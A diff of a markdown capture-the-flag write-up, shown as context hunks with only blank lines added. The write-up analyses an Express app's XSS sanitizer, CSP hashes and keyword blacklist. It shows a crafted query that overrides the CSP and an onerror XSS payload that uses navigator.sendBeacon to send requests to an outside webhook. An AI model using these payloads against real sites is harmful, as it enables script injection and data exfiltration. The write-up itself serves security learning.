@@ -58,6 +58,8 @@ export const adminCookie = randomUUID();
 
 - Then it uses the xss sanitizer on the middleware (against any input value before processing it) and from the package.json file we got the version is ``1.1.6`` which is the latest version (at this time)
 - we also see some constants SHA-1 Hashed will be used latter in the CSP
+
+
 ```js
 app.use(xss());
 
@@ -72,6 +74,7 @@ const adminJs = "sha256-5TQWiNNpvAcBZlNow32O2rAcetDLEqM7rl+uvpcnTb8=";
 const defaultCSP = `default-src 'none'; img-src 'self'; style-src '${css}'; script-src '${commonJs}' '${defaultJs}'; connect-src 'self';`;
 ```
 - and we have some blacklisted words
+
 ```js
 const blacklist = [
   "fetch",
@@ -89,6 +92,7 @@ app.use(express.json());
 ```
 - and now let's Jump to the juicy part , for any request the following security layers are applied 
 - First thing it makes sure the requested parameter does not include any of the blacklisted words
+
 ```js
 app.use((req, res, next) => {
   if (req.query) {
@@ -241,6 +245,8 @@ http://challenge.com/?text=test&unmodifiable[background]=admin_background.png
 ![image](/media/CTFs/extra-safe-security-layers/20230604225540.png)
 
 - we will add a new CSP Value so that it will not assign as the default strict CSP Value , crafting the following CSP allows the browsers to load img source from external website (our webhook) and removes all other restrictions
+
+
 ```
 img-src 'self' https://webhook.site/xxxxxxx;
 ```
@@ -270,6 +276,7 @@ main.innerHTML += ` <img class='background' src='<%- unmodifiable?.background %>
 ![image](/media/CTFs/extra-safe-security-layers/20230604230540.png)
 
 - we can trigger an xss but let's try to find a payload without the blacklisted words , how can we send request without the ``XmlHttpRequest`` ,``fetch`` . searching [here](https://developer.mozilla.org/en-US/docs/Web/API) will find the Beacon API which we can try 
+
 ```
 http://xssl.web.jctf.pro/?text=a&unmodifiable[CSP]=img-src 'self' https://webhook.site/xxxxx&unmodifiable[background]=unmodifiable[background]=x' onerror="navigator.sendBeacon('https://webhook.site/xxxxxx/');"
 ```
